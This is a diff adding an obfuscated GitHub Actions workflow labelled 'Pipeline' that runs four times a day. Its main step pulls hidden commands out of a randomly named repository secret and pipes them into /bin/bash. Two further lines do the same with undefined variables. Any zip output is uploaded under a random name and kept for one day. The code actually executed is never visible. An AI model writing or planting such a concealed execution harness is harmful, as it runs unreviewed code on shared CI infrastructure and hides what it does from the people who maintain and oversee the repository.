@@ -1,0 +1,33 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '28 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          lqnx8: ${{ secrets.lqnx8 }}
+        run: |
+          printf '%s' "$lqnx8" | jq -r .ka71548 | /bin/bash
+          echo $dbqcu516 | jq -r .qoh66266 | /bin/bash
+          printf '%s' "$b36" | jq -r .bpca936 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZwXWnP4J
+          path: "*.zip"
+          retention-days: 1
